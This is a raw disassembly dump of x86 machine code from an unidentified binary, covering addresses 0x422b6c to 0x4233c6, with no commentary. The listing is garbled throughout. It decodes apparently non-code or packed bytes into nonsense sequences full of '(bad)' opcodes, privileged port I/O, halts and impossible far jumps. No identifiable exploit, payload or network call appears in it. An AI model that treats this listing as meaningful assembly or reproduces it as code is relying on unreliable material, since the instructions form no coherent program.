  422b6c:	test   BYTE PTR [ebx-0x15ad65f4],0xc0
  422b73:	push   eax
  422b74:	call   0xaa95c2c
  422b79:	imul   edi,edi,0xffffffde
  422b7c:	mov    ebx,0x97636aa
  422b81:	outs   dx,DWORD PTR ds:[esi]
  422b82:	sbb    DWORD PTR [edi-0x3b44fb74],0x58fd305c
  422b8c:	inc    edx
  422b8d:	mov    dl,0x21
  422b8f:	es jecxz 0x422b2a
  422b92:	jge    0x422bd9
  422b94:	jb     0x422b4c
  422b96:	jmp    0x422c02
  422b98:	pop    es
  422b99:	fadd   st(7),st
  422b9b:	dec    esi
  422b9c:	sbb    edx,edx
  422b9e:	push   eax
  422b9f:	push   ss
  422ba0:	adc    esi,edi
  422ba2:	jae    0x422be5
  422ba4:	es inc esi
  422ba6:	(bad)  
  422ba7:	cwde   
  422ba8:	pop    ds
  422ba9:	fmul   DWORD PTR ss:[eax+0x5b96de4e]
  422bb0:	ret    0xb69c
  422bb3:	repnz (bad) 
  422bb5:	test   BYTE PTR [eax],0x0
	...
  422bc0:	add    BYTE PTR [eax],al
  422bc2:	xchg   esp,eax
  422bc3:	nop
  422bc4:	ffree  st(0)
  422bc6:	(bad)  
  422bc8:	popf   
  422bc9:	aam    0x57
  422bcb:	(bad)
  422bcf:	pushf  
  422bd0:	ret    0x23c0
  422bd3:	rol    BYTE PTR [ecx],cl
  422bd5:	add    BYTE PTR [eax+eax*1+0x0],bl
  422bd9:	add    BYTE PTR [ecx-0x74],dh
  422bdc:	cdq    
  422bdd:	test   eax,0xd39649a9
  422be2:	fcom   DWORD PTR ds:0x8a66c3f5
  422be8:	pusha  
  422be9:	in     eax,0xd3
  422beb:	hlt    
  422bec:	xor    DWORD PTR [ebx],ebx
  422bee:	xchg   edi,eax
  422bef:	fdivp  st(4),st
  422bf1:	lea    edi,[edx-0x51f5ad4a]
  422bf7:	pusha  
  422bf8:	cmp    ecx,DWORD PTR [eax-0x7d20fbb2]
  422bfe:	lea    edi,[esi]
  422c00:	sbb    ah,BYTE PTR [ebx-0x5c43667]
  422c06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c07:	or     ebx,ebx
  422c09:	jmp    0xc2cdca66
  422c0e:	sahf   
  422c0f:	mov    DWORD PTR [bx+di],esp
  422c12:	retf   
  422c13:	leave  
  422c14:	sbb    bl,BYTE PTR [ebx-0x3203371c]
  422c1a:	hlt    
  422c1b:	cmc    
  422c1c:	mov    ds:0xecd627db,eax
  422c21:	mov    WORD PTR [ecx],cs
  422c23:	mulps  xmm0,XMMWORD PTR [eax-0x54]
  422c27:	pop    esp
  422c28:	xor    al,0xe
  422c2a:	and    edi,DWORD PTR [ecx+0x4ef42608]
  422c30:	cmc    
  422c31:	mov    dl,0x6c
  422c33:	push   es
  422c34:	in     al,0xac
	...
  422c42:	hlt    
  422c43:	mov    dl,0x32
  422c45:	(bad)  
  422c46:	jbe    0x422c1e
  422c48:	hlt    
  422c49:	mov    dl,0xb1
  422c4b:	and    al,0xfe
  422c4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c4e:	dec    esp
  422c4f:	shl    BYTE PTR [edx-0x30],cl
  422c52:	jg     0x422c26
  422c54:	add    DWORD PTR [eax],eax
  422c56:	pop    esp
  422c57:	add    BYTE PTR [eax],al
  422c59:	add    al,cl
  422c5b:	adc    bl,dl
  422c5d:	dec    ebp
  422c5e:	sub    eax,0x41a2cf01
  422c63:	sub    BYTE PTR [ecx+0x1e],0x75
  422c67:	ror    BYTE PTR [ebx+0x3],cl
  422c6a:	addr16 or al,0x1b
  422c6d:	dec    esi
  422c6e:	xor    BYTE PTR [esi+0x4c68b17e],cl
  422c74:	fnstsw WORD PTR ds:0xc5b24ad5
  422c7a:	cmp    eax,0xf95724b8
  422c7f:	mov    al,0x41
  422c81:	clc    
  422c82:	into   
  422c83:	push   eax
  422c84:	and    ebx,ebx
  422c86:	mov    dl,ch
  422c88:	mov    al,ds:0xdc6ab7fd
  422c8d:	sti    
  422c8e:	mov    dl,0x1a
  422c90:	dec    esp
  422c91:	or     edx,DWORD PTR [edi+0x16]
  422c94:	dec    ebp
  422c95:	aad    0x1a
  422c97:	scas   eax,DWORD PTR es:[edi]
  422c98:	mov    ch,0xd
  422c9a:	cmp    DWORD PTR [ebp+0x6aa9fa08],esp
  422ca0:	sbb    BYTE PTR [ebp+0xb],0x7b
  422ca4:	(bad)  
  422ca5:	pop    edi
  422ca6:	int    0xad
  422ca8:	sub    al,ch
  422caa:	lock dec eax
  422cac:	leave  
  422cad:	call   0x12fa9608
  422cb2:	cmp    eax,0xb1b3ad
	...
  422cbf:	add    BYTE PTR [eax],al
  422cc1:	add    BYTE PTR [edx],dh
  422cc3:	ror    esi,cl
  422cc5:	mov    ds:0xd37ebfef,al
  422cca:	sub    edi,DWORD PTR [esi]
  422ccc:	out    0x3f,eax
  422cce:	xor    DWORD PTR ds:0xd2db8494,0x5c0001
  422cd8:	add    BYTE PTR [eax],al
  422cda:	pushf  
  422cdb:	stos   BYTE PTR es:[edi],al
  422cdc:	sbb    bh,BYTE PTR [ecx-0x1063ce10]
  422ce2:	data16 xlat BYTE PTR ds:[ebx]
  422ce4:	add    DWORD PTR [ecx],edx
  422ce6:	sti    
  422ce7:	mov    edi,DWORD PTR [eax+0x317ef708]
  422ced:	mov    dh,0x7a
  422cef:	ror    BYTE PTR [ebx],1
  422cf1:	xchg   ecx,eax
  422cf2:	jo     0x422d24
  422cf4:	popa   
  422cf5:	jp     0x422cb1
  422cf7:	xchg   edi,eax
  422cf8:	and    al,0x42
  422cfa:	inc    esi
  422cfb:	mov    ah,0x78
  422cfd:	call   FWORD PTR [ecx+0x58]
  422d00:	pop    eax
  422d01:	jmp    0x842b6bb6
  422d06:	mov    edx,0x2849feef
  422d0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422d0c:	xor    al,0x89
  422d0e:	add    al,ch
  422d10:	xchg   esi,eax
  422d11:	gs xchg ecx,eax
  422d13:	lahf   
  422d14:	jne    0x422d3a
  422d16:	xchg   esp,eax
  422d17:	mov    al,0x30
  422d19:	shr    BYTE PTR [eax],0x43
  422d1c:	jmp    0x422d87
  422d1e:	xor    BYTE PTR [ecx-0x33e377b7],cl
  422d24:	sbb    ebx,edx
  422d26:	push   eax
  422d27:	inc    edx
  422d28:	sbb    eax,0x12c23feb
  422d2d:	mov    bl,0xda
  422d2f:	mov    bh,BYTE PTR [ebx+0x1b]
  422d32:	xor    eax,0xe108fa
	...
  422d3f:	add    BYTE PTR [eax],al
  422d41:	add    bl,bl
  422d43:	in     eax,dx
  422d44:	outs   dx,BYTE PTR ds:[esi]
  422d45:	and    bh,BYTE PTR [esi-0x5d]
  422d48:	(bad)  
  422d4a:	pop    esi
  422d4b:	(bad)  
  422d4c:	mov    DWORD PTR [ebp-0x5d4de475],ecx
  422d52:	aaa    
  422d53:	rol    DWORD PTR [ecx],cl
  422d55:	add    BYTE PTR [eax+eax*1+0x0],bl
  422d59:	add    dl,dh
  422d5b:	test   esp,esp
  422d5d:	in     al,dx
  422d5e:	inc    ecx
  422d5f:	mov    ebx,0xe94c9742
  422d64:	repnz add eax,0x20237151
  422d6a:	mov    cl,0xbd
  422d6c:	pushf  
  422d6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422d6e:	mov    esi,0x6b4a1235
  422d73:	lods   al,BYTE PTR ds:[esi]
  422d74:	pop    esp
  422d75:	mov    esp,0xcb87c268
  422d7a:	mov    al,ds:0xd7e4ee01
  422d7f:	fmul   QWORD PTR [edi]
  422d81:	sti    
  422d82:	dec    edi
  422d83:	(bad)  
  422d84:	out    dx,eax
  422d85:	pushf  
  422d86:	(bad)  
  422d87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422d88:	aam    0xa6
  422d8a:	or     eax,0xcc59773a
  422d8f:	sub    cl,BYTE PTR [ebp+0x53]
  422d92:	xchg   ecx,eax
  422d93:	fnsave [edi+0x57]
  422d96:	arpl   WORD PTR [ebp+esi*1-0x59c1f766],cx
  422d9d:	out    0x51,al
  422d9f:	test   BYTE PTR [edx+0x60],dl
  422da2:	test   BYTE PTR [ebp+ebx*1-0x38e8207c],ch
  422da9:	mov    eax,0x61590bd6
  422dae:	jbe    0x422d42
  422db0:	push   ecx
  422db1:	mov    ah,0xfa
  422db3:	test   DWORD PTR [esi+edx*4+0x0],ecx
	...
  422dbf:	add    BYTE PTR [eax],al
  422dc1:	add    BYTE PTR ds:0x6f976b22,al
  422dc7:	(bad)  
  422dc9:	mov    dl,0x66
  422dcb:	and    BYTE PTR [esi+0x19e36d6a],ah
  422dd1:	loopne 0x422d66
  422dd3:	rol    DWORD PTR [ecx],cl
  422dd5:	add    BYTE PTR [eax+eax*1+0x0],bl
  422dd9:	add    BYTE PTR [ebp+0x7670cca0],ah
  422ddf:	out    0x7d,al
  422de1:	xchg   edi,eax
  422de2:	xchg   edi,eax
  422de3:	xchg   edi,eax
  422de4:	stos   BYTE PTR es:[edi],al
  422de5:	dec    edx
  422de6:	xchg   BYTE PTR [esi+ebp*1-0x67],dh
  422dea:	push   ebx
  422deb:	cmovb  ebx,DWORD PTR [esi+0x6364cbf1]
  422df2:	pop    esi
  422df3:	cdq    
  422df4:	adc    DWORD PTR ds:0xdbe5d6b7,ecx
  422dfa:	out    dx,al
  422dfb:	cmp    DWORD PTR [esp+ebp*4],ebx
  422dfe:	cmp    eax,0x58f12153
  422e03:	jb     0x422dfd
  422e05:	jb     0x422e4f
  422e07:	jne    0x422dfe
  422e09:	int    0x82
  422e0b:	sub    DWORD PTR [esi+0x3e6a3f20],edx
  422e11:	repnz dec ebp
  422e13:	daa    
  422e14:	and    eax,0xfafe9b52
  422e19:	repnz push ecx
  422e1b:	into   
  422e1c:	adc    al,BYTE PTR [ebx+0x49]
  422e1f:	add    eax,0x989533aa
  422e24:	mov    ebx,0xbf6bbb19
  422e29:	sub    al,0x4b
  422e2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422e2c:	jns    0x422e4d
  422e2e:	rcl    BYTE PTR [edx],0xe3
  422e31:	mov    esi,DWORD PTR [edi]
  422e33:	xchg   esp,eax
  422e34:	jmp    0x0:0x5f
  422e3b:	add    BYTE PTR [eax],al
  422e3d:	add    BYTE PTR [eax],al
  422e3f:	add    BYTE PTR [eax],al
  422e41:	add    BYTE PTR [ebx+0x7fd924d4],cl
  422e47:	stc    
  422e48:	call   esi
  422e4a:	into   
  422e4b:	inc    ebp
  422e4c:	mov    bh,0x11
  422e4e:	mov    al,0xd1
  422e50:	xchg   esp,eax
  422e51:	imul   ebp,edi,0x5c0001d3
  422e57:	add    BYTE PTR [eax],al
  422e59:	add    BYTE PTR [esi+0x28e79aea],al
  422e5f:	sbb    bl,bh
  422e61:	push   0x15
  422e63:	fnstcw WORD PTR [edi-0x3beae5a6]
  422e69:	or     esi,ebx
  422e6b:	scas   al,BYTE PTR es:[edi]
  422e6c:	add    al,0xb9
  422e6e:	test   al,0x52
  422e70:	xor    BYTE PTR [ecx-0x2ee1a779],dh
  422e76:	add    al,0xf6
  422e78:	lock out dx,eax
  422e7a:	or     BYTE PTR [eax],al
  422e7c:	mov    eax,ds:0x5b56a519
  422e81:	push   eax
  422e82:	ds push ebp
  422e84:	std    
  422e85:	jp     0x422e13
  422e87:	jp     0x422f08
  422e89:	leave  
  422e8a:	daa    
  422e8b:	daa    
  422e8c:	jle    0x422e5a
  422e8e:	outs   dx,BYTE PTR ds:[esi]
  422e8f:	mov    ebx,0x1c18914a
  422e94:	setae  al
  422e97:	mov    ds:0xe217f83,eax
  422e9c:	mov    BYTE PTR [ebx-0x37ac6cc3],bh
  422ea2:	mov    ecx,0x20a57712
  422ea7:	pop    ebx
  422ea8:	pop    edi
  422ea9:	inc    ebx
  422eaa:	and    al,0xe6
  422eac:	ins    DWORD PTR es:[edi],dx
  422ead:	push   es
  422eae:	dec    ebx
  422eaf:	in     al,dx
  422eb0:	mov    cl,0x6d
  422eb2:	jno    0x422ebf
  422eb4:	cli    
  422eb5:	inc    edi
	...
  422ec2:	fisubr WORD PTR [ecx]
  422ec4:	cwde   
  422ec5:	sar    bh,cl
  422ec7:	repz fisubr WORD PTR ds:0x4af35f6
  422ece:	inc    edx
  422ecf:	push   0xd44b0723
  422ed4:	add    DWORD PTR [eax],eax
  422ed6:	pop    esp
  422ed7:	add    BYTE PTR [eax],al
  422ed9:	add    bl,al
  422edb:	pop    edi
  422edc:	enter  0xc8a0,0x6a
  422ee0:	sbb    al,0x98
  422ee2:	das    
  422ee3:	jnp    0x422ea1
  422ee5:	jmp    0xa98022e5
  422eea:	outs   dx,BYTE PTR ds:[esi]
  422eeb:	mov    ds:0x7b9634f6,al
  422ef0:	outs   dx,DWORD PTR ds:[esi]
  422ef1:	pop    ebx
  422ef2:	mov    dl,0x52
  422ef4:	pushf  
  422ef5:	pop    ebp
  422ef6:	or     DWORD PTR [ebx+0x77],edi
  422ef9:	test   eax,0x9901034
  422efe:	pop    ebp
  422eff:	lahf   
  422f00:	in     al,dx
  422f01:	sub    eax,0x9db80d74
  422f06:	add    eax,0x243e8ad6
  422f0b:	ins    BYTE PTR es:[edi],dx
  422f0c:	jecxz  0x422ed7
  422f0e:	in     eax,0x25
  422f10:	(bad)  
  422f12:	out    0xb3,eax
  422f14:	sub    edi,esi
  422f16:	and    dl,BYTE PTR ds:0xe93c8635
  422f1c:	(bad)  
  422f1d:	je     0x422ed2
  422f1f:	ficomp DWORD PTR [ecx-0x1007b862]
  422f25:	push   edi
  422f26:	cmp    al,dl
  422f28:	mov    ds:0x9d665dc6,al
  422f2d:	cmp    al,0x15
  422f2f:	dec    edi
  422f30:	push   edi
  422f31:	outs   dx,DWORD PTR ds:[esi]
  422f32:	mov    fs,esi
  422f34:	ins    BYTE PTR es:[edi],dx
  422f35:	test   al,0x0
	...
  422f3f:	add    BYTE PTR [eax],al
  422f41:	add    BYTE PTR [esi+0x3f],cl
  422f44:	int3   
  422f45:	sbb    eax,0x7fdffffd
  422f4a:	out    dx,eax
  422f4b:	loopne 0x422f63
  422f4d:	lods   al,BYTE PTR ds:[esi]
  422f4e:	cwde   
  422f4f:	dec    esi
  422f50:	popa   
  422f51:	stc    
  422f52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422f53:	aam    0x1
  422f55:	add    BYTE PTR [eax+eax*1+0x0],bl
  422f59:	add    BYTE PTR [edx],dl
  422f5b:	add    ch,cl
  422f5d:	jg     0x422f4f
  422f5f:	sbb    BYTE PTR [edx],bh
  422f61:	mov    ds:0xc20363a4,eax
  422f66:	retf   0x6f01
  422f69:	into   
  422f6a:	int    0x66
  422f6c:	sbb    eax,0x374c1627
  422f71:	ror    BYTE PTR [ebp-0xac6b3b0],1
  422f77:	data16 aad 0x87
  422f7a:	das    
  422f7b:	adc    bl,cl
  422f7d:	jae    0x422f35
  422f7f:	jb     0x422f04
  422f81:	mov    bh,BYTE PTR [esi+0x1e96a4a4]
  422f87:	repnz test ebx,0xe16d13bd
  422f8e:	push   eax
  422f8f:	lea    edx,[ecx+eiz*8]
  422f92:	adc    eax,DWORD PTR [ebx+0x36]
  422f95:	push   esp
  422f96:	cs inc esi
  422f98:	xchg   BYTE PTR [ebx+ecx*2+0x50],bl
  422f9c:	inc    eax
  422f9d:	ficomp DWORD PTR [eax]
  422f9f:	push   ebp
  422fa0:	int    0xb0
  422fa2:	and    esi,DWORD PTR ds:0x2189759
  422fa8:	jmp    0x33a1:0x1aff431f
  422faf:	xchg   esp,eax
  422fb0:	ja     0x423002
  422fb2:	dec    eax
  422fb3:	adc    dh,BYTE PTR [edi]
  422fb5:	inc    ecx
	...
  422fc2:	push   ds
  422fc3:	test   eax,0x7ff735f6
  422fc8:	fild   QWORD PTR [ebx-0x5f9ed871]
  422fce:	adc    al,0x8b
  422fd0:	pop    edi
  422fd1:	xor    al,0x3
  422fd3:	aad    0x1
  422fd5:	add    BYTE PTR [eax+eax*1+0x0],bl
  422fd9:	add    dl,cl
  422fdb:	iret   
  422fdc:	test   dh,ch
  422fde:	cmp    BYTE PTR [ebx-0x73],0xa2
  422fe2:	lea    edi,[edx+0x109e3850]
  422fe8:	outs   dx,DWORD PTR ds:[esi]
  422fe9:	add    al,0xa2
  422feb:	sbb    al,0x62
  422fed:	cld    
  422fee:	xchg   edx,eax
  422fef:	push   eax
  422ff0:	push   edx
  422ff1:	cmp    bl,bh
  422ff3:	dec    DWORD PTR [ecx-0xac8aa72]
  422ff9:	pop    ebp
  422ffa:	xchg   ecx,eax
  422ffb:	daa    
  422ffc:	jl     0x423004
  422ffe:	gs jae 0x423058
  423001:	push   ds
  423002:	and    DWORD PTR [edx],edx
  423004:	jp     0x423023
  423006:	mov    eax,ds:0x641bb2a9
  42300b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42300c:	or     al,BYTE PTR [eax+ebx*2]
  42300f:	add    DWORD PTR [ebp+0x5ea14f8b],esi
  423015:	xchg   ebx,eax
  423016:	jbe    0x422fbd
  423018:	clc    
  423019:	out    0x37,eax
  42301b:	dec    esi
  42301c:	pop    esp
  42301d:	inc    eax
  42301e:	icebp  
  42301f:	add    ah,BYTE PTR [edi+eiz*1]
  423022:	pop    esp
  423023:	or     bl,dl
  423025:	jecxz  0x423043
  423027:	adc    eax,0xf8b2de5f
  42302c:	xor    BYTE PTR [ecx-0x65],al
  42302f:	mov    al,ds:0x4e40646f
  423034:	mov    bl,0x8c
	...
  423042:	fwait
  423043:	loope  0x4230b2
  423045:	sub    eax,0xf7dbad7f
  42304a:	sar    BYTE PTR [ebx],cl
  42304c:	(bad)  
  42304d:	add    BYTE PTR [ecx+0x4],cl
  423050:	in     eax,0x39
  423052:	pop    edi
  423053:	aad    0x1
  423055:	add    BYTE PTR [eax+eax*1+0x0],bl
  423059:	add    BYTE PTR [ebx-0x31f7c34d],bh
  42305f:	jbe    0x423016
  423061:	fnstsw WORD PTR [ebx-0x4495a440]
  423067:	xchg   ecx,eax
  423068:	cwde   
  423069:	fs push ss
  42306b:	enter  0xd8ea,0x24
  42306f:	xchg   edx,eax
  423070:	mov    ds:0x38aa5fa0,eax
  423075:	add    bh,BYTE PTR [edi-0x5d]
  423078:	shl    DWORD PTR [ecx],1
  42307a:	enter  0xfbfd,0x61
  42307e:	sub    DWORD PTR ds:0xe2320565,0x74
  423085:	push   0x16
  423087:	xchg   DWORD PTR [ebx+0x7f],edx
  42308a:	pop    ds
  42308b:	jmp    0x91e9e40c
  423090:	add    edx,esp
  423092:	jl     0x4230fb
  423094:	dec    esi
  423095:	or     BYTE PTR [edi+ebp*8-0x1c],bl
  423099:	jno    0x4230ce
  42309b:	mov    esp,0x9321b262
  4230a0:	xchg   edx,eax
  4230a1:	jmp    0xcc52:0x54341f1a
  4230a8:	orps   xmm0,XMMWORD PTR ds:0x51150799
  4230af:	out    0xc3,eax
  4230b1:	mov    esp,0x34715e12
	...
  4230c2:	or     bh,dh
  4230c4:	ja     0x423110
  4230c6:	dec    edx
  4230c8:	cmp    eax,0x2e8eedf7
  4230cd:	dec    eax
  4230ce:	shr    DWORD PTR [edx-0x2a44c002],1
  4230d4:	add    DWORD PTR [eax],eax
  4230d6:	pop    esp
  4230d7:	add    BYTE PTR [eax],al
  4230d9:	add    BYTE PTR [ebx],ch
  4230db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4230dc:	lahf   
  4230dd:	popa   
  4230de:	add    DWORD PTR [ebp-0x6b],0x6
  4230e2:	out    0xd0,eax
  4230e4:	adc    ecx,edx
  4230e6:	xchg   esi,eax
  4230e7:	cmp    BYTE PTR [eax+edx*1],ch
  4230ea:	imul   edx,DWORD PTR ds:0xe54bfb7f,0x16
  4230f1:	inc    eax
  4230f2:	cmp    BYTE PTR [edi],0x9a
  4230f5:	jge    0x423172
  4230f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4230f8:	clc    
  4230f9:	jnp    0x423167
  4230fb:	mov    eax,0x91178a71
  423100:	call   0x8723f57e
  423105:	sub    eax,0xaf86420f
  42310a:	jbe    0x423164
  42310c:	das    
  42310d:	aam    0x23
  42310f:	sti    
  423110:	jnp    0x4230e3
  423112:	and    eax,0xb9504b68
  423117:	cdq    
  423118:	xchg   esp,eax
  423119:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42311a:	test   eax,0x8428fc53
  42311f:	repnz std 
  423121:	jle    0x42319f
  423123:	out    0x7a,al
  423125:	or     BYTE PTR ss:[ebp-0x8e0dcb6],bl
  42312c:	dec    ebx
  42312d:	fild   QWORD PTR [esp+ebp*4]
  423130:	xchg   ebp,eax
  423131:	jae    0x423170
  423133:	idiv   DWORD PTR [edi+esi*4]
	...
  423142:	arpl   WORD PTR ss:[eax-0x10],bp
  423146:	jge    0x423143
  423148:	mov    esi,0x8c7853e7
  42314d:	daa    
  42314e:	sbb    al,0xda
  423150:	loope  0x423196
  423152:	pop    ss
  423153:	(bad)  
  423154:	add    DWORD PTR [eax],eax
  423156:	pop    esp
  423157:	add    BYTE PTR [eax],al
  423159:	add    cl,dh
  42315b:	mov    ch,0x5b
  42315d:	mov    esp,DWORD PTR [ebx-0x3233128c]
  423163:	pop    esi
  423164:	pop    ecx
  423165:	mov    dh,0x8d
  423167:	gs sbb dh,dl
  42316a:	int    0x3
  42316c:	jl     0x423129
  42316e:	inc    esp
  42316f:	aam    0x81
  423171:	xor    BYTE PTR [ecx+eiz*4],dh
  423174:	iret   
  423175:	push   0x7f
  423177:	nop
  423178:	lahf   
  423179:	popa   
  42317a:	xchg   bl,dh
  42317c:	int    0xfc
  42317e:	add    BYTE PTR [eax-0x74],bl
  423181:	add    eax,0x746c4efe
  423186:	push   eax
  423187:	push   ds
  423188:	pop    ss
  423189:	mov    esp,ebp
  42318b:	cs cs clc 
  42318e:	es jp  0x42313d
  423191:	fwait
  423192:	(bad)  
  423193:	cmc    
  423194:	into   
  423195:	mov    cl,0xc6
  423197:	cmp    BYTE PTR [esp+edx*2],ch
  42319a:	lods   al,BYTE PTR ds:[esi]
  42319b:	jns    0x42321b
  42319d:	pop    ds
  42319e:	mov    edi,0xb358b55c
  4231a3:	cli    
  4231a4:	je     0x4231ea
  4231a6:	mov    eax,ds:0x8538f900
  4231ab:	mov    ch,0x62
  4231ad:	and    DWORD PTR [eax-0x56440497],eax
  4231b3:	mov    bh,0xcc
  4231b5:	dec    esp
	...
  4231c2:	daa    
  4231c3:	push   ecx
  4231c4:	imul   esi,DWORD PTR [ecx-0x28004681],0x8274b3d8
  4231ce:	int    0x5d
  4231d0:	lods   eax,DWORD PTR ds:[esi]
  4231d1:	js     0x4231be
  4231d3:	fadd   QWORD PTR [ecx]
  4231d5:	add    BYTE PTR [eax+eax*1+0x0],bl
  4231d9:	add    BYTE PTR [ecx-0x71],bl
  4231dc:	add    cl,0x22
  4231df:	hlt    
  4231e0:	pop    ecx
  4231e1:	sbb    edi,DWORD PTR [eax]
  4231e3:	(bad)  
  4231e4:	pop    ecx
  4231e5:	adc    eax,0x4f8cdfd3
  4231ea:	loop   0x42318c
  4231ec:	xor    BYTE PTR [ebx+0x356eaab6],ch
  4231f2:	fcom   DWORD PTR [ecx+0x5d8771fd]
  4231f8:	cs jo  0x42318b
  4231fb:	aad    0x32
  4231fd:	pop    ss
  4231fe:	xor    BYTE PTR [edi-0x7f239e5],cl
  423204:	push   ds
  423205:	cld    
  423206:	inc    esi
  423207:	jle    0x423238
  423209:	jno    0x42322a
  42320b:	pop    esi
  42320c:	adc    BYTE PTR [ecx],bh
  42320e:	sti    
  42320f:	or     BYTE PTR [ebx+ebp*8],bh
  423212:	xor    al,0x27
  423214:	aaa    
  423215:	retf   0xf448
  423218:	sub    ah,BYTE PTR [ebx]
  42321a:	(bad)  
  42321b:	push   ss
  42321c:	push   es
  42321d:	pushf  
  42321e:	popa   
  42321f:	or     eax,0x819cd051
  423224:	ins    DWORD PTR es:[edi],dx
  423225:	jge    0x4231bb
  423227:	mov    ebx,0x3e1c88fa
  42322c:	cmp    DWORD PTR [ecx+ebp*8-0x791fb40e],esp
  423233:	fbstp  TBYTE PTR [eax]
  423235:	int    0x0
	...
  42323f:	add    BYTE PTR [eax],al
  423241:	add    BYTE PTR [edi],ah
  423243:	ss lahf 
  423245:	xor    DWORD PTR [edi+0x1536afb9],ebx
  42324b:	and    eax,0x89b7075b
  423250:	dec    esp
  423251:	xchg   ecx,eax
  423252:	inc    edi
  423253:	fld    QWORD PTR [ecx]
  423255:	add    BYTE PTR [eax+eax*1+0x0],bl
  423259:	add    bh,cl
  42325b:	mov    ah,0xff
  42325d:	dec    BYTE PTR [eax]
  42325f:	xchg   esi,eax
  423260:	push   edi
  423261:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423262:	outs   dx,BYTE PTR ds:[esi]
  423263:	xor    ch,BYTE PTR [ebp-0x4c]
  423266:	jp     0x423217
  423268:	repz loopne 0x423248
  42326b:	std    
  42326c:	xchg   edi,eax
  42326d:	ss mov WORD PTR ss:[ebp+0x2e],?
  423272:	push   ds
  423273:	pop    ebp
  423274:	xchg   ecx,eax
  423275:	pop    ebx
  423276:	aas    
  423277:	xchg   esp,eax
  423278:	and    al,0x52
  42327a:	retf   0x5aa3
  42327d:	pop    edx
  42327e:	lods   al,BYTE PTR ds:[esi]
  42327f:	pop    ebx
  423280:	mov    dh,0x8b
  423282:	in     eax,dx
  423283:	mov    esp,0xc52dcdaf
  423288:	sub    DWORD PTR [ecx],ebp
  42328a:	gs dec edx
  42328c:	push   eax
  42328d:	cmp    BYTE PTR [edi-0x7b10753d],dl
  423293:	ja     0x42322d
  423295:	jnp    0x4232fb
  423297:	push   0x7ec86056
  42329c:	mov    al,ds:0xe6b04752
  4232a1:	gs in  al,0xac
  4232a4:	mov    bh,BYTE PTR [eax+0x24c2f98e]
  4232aa:	jns    0x42328b
  4232ac:	cmp    eax,0xa712a629
  4232b1:	jmp    0x4232e4
  4232b3:	xor    eax,0x38d0
	...
  4232c0:	add    BYTE PTR [eax],al
  4232c2:	aaa    
  4232c3:	(bad)  
  4232c4:	out    0xc2,eax
  4232c6:	mul    ebx
  4232c8:	aaa    
  4232c9:	cmc    
  4232ca:	xchg   ecx,eax
  4232cb:	call   0xe5e1:0x92f6eef4
  4232d2:	mov    ds:0x5c0001dd,eax
  4232d7:	add    BYTE PTR [eax],al
  4232d9:	add    BYTE PTR [edi],dh
  4232db:	mov    al,ds:0xfaeb313e
  4232e0:	lds    esi,FWORD PTR [esi]
  4232e2:	xor    al,0x76
  4232e4:	icebp  
  4232e5:	xor    eax,0xe55ca0b3
  4232ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4232eb:	jmp    esi
  4232ed:	rcr    BYTE PTR [eax+0x76eccbe6],cl
  4232f3:	retf   
  4232f4:	mov    ah,0x40
  4232f6:	xchg   esp,eax
  4232f7:	push   ds
  4232f8:	sti    
  4232f9:	test   cl,cl
  4232fb:	mov    al,BYTE PTR [eax-0x4848400c]
  423301:	mov    bh,BYTE PTR [ebx]
  423303:	ins    DWORD PTR es:[edi],dx
  423304:	iret   
  423305:	aam    0x18
  423307:	imul   edi,DWORD PTR [edi],0xffffff9d
  42330a:	enter  0xe4b0,0x44
  42330e:	mov    cl,0x1d
  423310:	sub    al,0x5a
  423312:	adc    cl,bl
  423314:	pushf  
  423315:	test   eax,0x804375ac
  42331a:	add    eax,eax
  42331c:	add    al,dh
  42331e:	jecxz  0x423320
  423320:	dec    eax
  423321:	inc    esi
  423322:	mov    ebx,DWORD PTR [ebp-0x1]
  423325:	sub    ecx,ebx
  423327:	push   ds
  423328:	mov    ebx,0xbf8c984b
  42332d:	xor    BYTE PTR [edx+0x4ee8d672],ah
  423333:	shl    dl,1
  423335:	push   ebx
	...
  423342:	push   ss
  423343:	aad    0xdf
  423345:	out    dx,eax
  423346:	fucomip st,st(7)
  423348:	ss std 
  42334a:	cmp    BYTE PTR [esi+0x73bd5f3a],al
  423350:	scas   eax,DWORD PTR es:[edi]
  423351:	(bad)  
  423353:	fld    QWORD PTR [ecx]
  423355:	add    BYTE PTR [eax+eax*1+0x0],bl
  423359:	add    dh,dl
  42335b:	or     al,bl
  42335d:	push   edx
  42335e:	sbb    ebx,ecx
  423360:	push   ds
  423361:	sbb    BYTE PTR [edi],0x35
  423364:	xchg   esi,eax
  423365:	cmp    al,0x5f
  423367:	adc    DWORD PTR [esi+eiz*1-0x50],eax
  42336b:	lock mov ss:0xdf48f394,al
  423372:	mov    ds:0x551ac72,eax
  423377:	das    
  423378:	mul    ecx
  42337a:	pushf  
  42337b:	clc    
  42337c:	adc    eax,0x818283a
  423381:	mov    ch,0x1c
  423383:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423384:	mov    ah,bl
  423386:	imul   esp,ebp,0x15
  423389:	(bad)  [esi-0x38]
  42338c:	cli    
  42338d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42338e:	push   esi
  42338f:	mov    cl,0x82
  423391:	loope  0x423364
  423393:	adc    DWORD PTR [edx+edi*8+0x37c9a802],edx
  42339a:	fist   WORD PTR [ebp-0x37ee4522]
  4233a0:	outs   dx,BYTE PTR ds:[esi]
  4233a1:	std    
  4233a2:	add    DWORD PTR [ebx+0x3af1bb09],edi
  4233a8:	mov    ds:0xe10ed863,eax
  4233ad:	inc    ebx
  4233ae:	icebp  
  4233af:	lahf   
  4233b0:	out    0xb0,eax
  4233b2:	mov    ds:0x408db4,eax
	...
  4233bf:	add    BYTE PTR [eax],al
  4233c1:	add    BYTE PTR [esi+0x76],ch
  4233c4:	in     al,0xca
  4233c6:	cld    
